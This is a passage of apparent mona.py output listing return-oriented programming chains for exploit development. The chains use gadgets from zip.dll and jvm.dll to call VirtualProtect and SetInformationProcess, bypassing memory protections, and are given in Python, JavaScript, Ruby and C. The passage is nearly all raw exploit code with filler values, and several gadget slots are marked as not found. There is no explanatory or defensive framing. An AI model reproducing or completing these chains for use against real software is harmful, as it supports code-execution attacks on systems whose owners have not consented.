                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d324c50,  # POP ECX # RETN [zip.dll] 
                0x6d32ae52,  # &Writable location [zip.dll]
                0x6d3228b0,  # POP EDI # POP ESI # RETN [zip.dll] 
                0x6d324c9c,  # RETN (ROP NOP) [zip.dll]
                0x41414141,  # Filler (compensate)
                0x6d324c9b,  # POP EAX # RETN [zip.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%u34f8%u6d32" + // 0x6d3234f8 : ,# POP EBP # RETN [zip.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u4b54%u6d32" + // 0x6d324b54 : ,# POP EBX # RETN [zip.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find a gadget to clear edx
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4c50%u6d32" + // 0x6d324c50 : ,# POP ECX # RETN [zip.dll] 
              "%uae52%u6d32" + // 0x6d32ae52 : ,# &Writable location [zip.dll]
              "%u28b0%u6d32" + // 0x6d3228b0 : ,# POP EDI # POP ESI # RETN [zip.dll] 
              "%u4c9c%u6d32" + // 0x6d324c9c : ,# RETN (ROP NOP) [zip.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4c9b%u6d32" + // 0x6d324c9b : ,# POP EAX # RETN [zip.dll] 
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d323400,  # POP ECX # RETN [zip.dll] 
                0x6d3280ac,  # &0x00000002 [zip.dll]
                0x6d324bb8,  # POP EBX # RETN [zip.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d324c9b,  # POP EAX # RETN [zip.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d322062,  # POP EDI # POP ESI # POP EBP # RETN [zip.dll] 
                0x6d322062,  # skip 4 bytes [zip.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  // [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  // [-] Unable to find a gadget to clear edx
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
